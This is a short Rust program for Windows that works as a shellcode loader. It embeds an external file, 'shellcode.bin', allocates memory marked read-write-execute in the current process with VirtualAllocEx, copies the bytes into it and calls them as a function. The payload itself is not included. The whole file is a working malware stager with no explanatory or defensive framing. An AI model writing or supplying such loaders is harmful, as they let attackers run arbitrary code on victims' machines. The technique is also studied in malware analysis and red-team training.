use std::{intrinsics::copy_nonoverlapping, mem::transmute, ptr::null_mut};

use windows_sys::Win32::System::{
    Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
    Threading::GetCurrentProcess,
};

#[unsafe(link_section = ".data")]
static SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");

fn main() {
    unsafe {
        let shellcode_size = SHELLCODE.len();

        let exec_mem = VirtualAllocEx(
            GetCurrentProcess(),
            null_mut(),
            shellcode_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        copy_nonoverlapping(SHELLCODE.as_ptr(), exec_mem as *mut u8, shellcode_size);

        let shellcode_fn: extern "C" fn() = transmute(exec_mem);
        shellcode_fn();
    }
}
